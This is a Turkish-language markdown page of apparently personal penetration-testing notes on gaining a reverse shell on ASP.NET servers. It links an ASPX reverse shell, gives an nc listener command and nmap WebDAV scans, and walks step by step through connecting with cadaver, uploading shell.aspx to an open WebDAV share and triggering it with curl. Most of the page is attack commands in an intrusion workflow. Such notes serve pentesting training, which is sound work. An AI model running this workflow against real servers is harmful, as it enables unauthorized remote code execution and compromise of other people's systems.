---
layout: default
title: Notlar 2
permalink: /notlar2/
---

# Notlar 2

## ASPX Reverse Shell

Eğer hedefte `.aspx` dosya upload edilebiliyorsa veya web sunucusu ASP.NET çalıştırıyorsa, aşağıdaki reverse shell'i kullanabilirsin:

**Kaynak:** https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx

GitHub'daki `shell.aspx` dosyasını indir, IP ve PORT'u değiştir ve hedef sunucuya upload et. Çalıştırıldığında reverse shell sağlar.

Örnek:
```powershell
# Attacker tarafında listener açıp
nc -lvnp 4444

# Hedef tarafında shell.aspx'i web üzerinden erişip açtığında bağlantı kurulur
http://target.com/shell.aspx
```

---

## WebDAV Nedir? Ne İşe Yarar?

**WebDAV** (Web Distributed Authoring and Versioning), HTTP protokolünü genişleten bir protokoldür. Dosya upload, download, silme, dizin oluşturma gibi işlemler HTTP üzerinden yapılabilir.

**İşlevler:**
- `PUT` : Dosya upload
- `GET` : Dosya download
- `DELETE` : Dosya silme
- `MKCOL` : Dizin oluşturma
- `MOVE` / `COPY` : Dosya taşıma/kopyalama

**Pentesting açısından:**
- WebDAV açıksa `.aspx`, `.php`, `.jsp` gibi web shell dosyaları upload edilebilir.
- Authentication olmadan erişilebilirse doğrudan RCE sağlanabilir.

### Nmap ile WebDAV Tespiti

Nmap script'ini çalıştırarak WebDAV portlarını ve metodlarını tespit edebilirsin:

```bash
nmap -p 80,443,8080 -A target.com
```

Çıktta `WebDAV` veya `Allow: PUT, GET, POST, DELETE, MKCOL` gibi göreceğin cümleler WebDAV'ın aktif olduğunu gösterir.

Daha detaylı:
```bash
nmap -p 80,443 -sV --script http-webdav-scan target.com
```

Bu, hedefte WebDAV metod ve paylaşımları listeler.

---

## Cadaver ile WebDAV Bağlanma

`cadaver`, WebDAV sunucularına bağlanmak için CLI aracıdır.

### Bağlanma

```bash
cadaver http://target.com/webdav/
```

Eğer authentication gerekirse:
```bash
cadaver http://target.com/webdav/
# Prompt'ta username/password gir
```

### Temel Komutlar (Cadaver içinde)

```bash
ls                          # Dosya ve klasörleri listele
pwd                         # Mevcut dizini göster
cd <dir>                    # Dizine gir
mkdir <dir>                 # Yeni dizin oluştur
```

### Dosya İndirme (GET)

```bash
get remote-file.txt         # remote-file.txt'i lokal makineye indir
```

### Dosya Gönderme (PUT)

```bash
put shell.aspx              # Lokal shell.aspx'i hedefe upload et
```

### Dosya Silme

```bash
delete unwanted-file.txt    # Dosyayı sil
```

### Çıkış

```bash
exit
# veya Ctrl+D
```

### Örnek İş Akışı

```bash
# 1. Bağlan
cadaver http://192.168.1.100/webdav/

# 2. Listeleme
ls

# 3. WebDAV paylaşımına .aspx shell upload et
put shell.aspx

# 4. Tarayıcı/curl ile shell çalıştır
curl http://192.168.1.100/webdav/shell.aspx

# 5. Reverse shell bağlantısı alınır
```

---

**Özet iş akışı:** 
WebDAV tespit et (nmap) → cadaver ile bağlan → `.aspx` shell upload et → HTTP üzerinden reverse shell başlat
